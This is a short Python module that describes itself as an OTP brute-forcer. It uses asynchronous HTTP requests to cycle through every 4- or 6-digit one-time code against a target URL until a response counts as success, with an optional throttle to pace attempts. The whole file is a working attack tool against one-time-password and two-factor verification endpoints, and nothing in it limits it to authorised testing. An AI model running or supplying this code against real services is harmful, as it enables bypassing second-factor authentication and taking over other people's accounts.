"""OTP brute-forcer — async fuzzer for 4/6-digit one-time passwords, with throttle."""
from __future__ import annotations

import asyncio
from collections.abc import Awaitable, Callable, Iterator
from dataclasses import dataclass

import httpx

SuccessPredicate = Callable[[httpx.Response], Awaitable[bool]]
SleepFn = Callable[[float], Awaitable[None]]


@dataclass
class OtpResult:
    found: bool
    code: str | None
    attempts: int


def generate_otps(length: int, limit: int | None = None) -> Iterator[str]:
    """Yield zero-padded numeric codes of ``length`` digits, up to ``limit`` of them."""
    total = 10**length
    count = total if limit is None else min(limit, total)
    for i in range(count):
        yield str(i).zfill(length)


async def brute_otp(
    client: httpx.AsyncClient,
    url: str,
    *,
    length: int,
    field: str,
    success: SuccessPredicate,
    limit: int | None = None,
    throttle_s: float = 0.0,
    sleep: SleepFn = asyncio.sleep,
) -> OtpResult:
    """Try OTP codes against ``url`` until one succeeds or the space is exhausted."""
    attempts = 0
    for code in generate_otps(length, limit=limit):
        attempts += 1
        if throttle_s > 0.0:
            await sleep(throttle_s)
        resp = await client.post(url, json={field: code})
        if await success(resp):
            return OtpResult(found=True, code=code, attempts=attempts)
    return OtpResult(found=False, code=None, attempts=attempts)
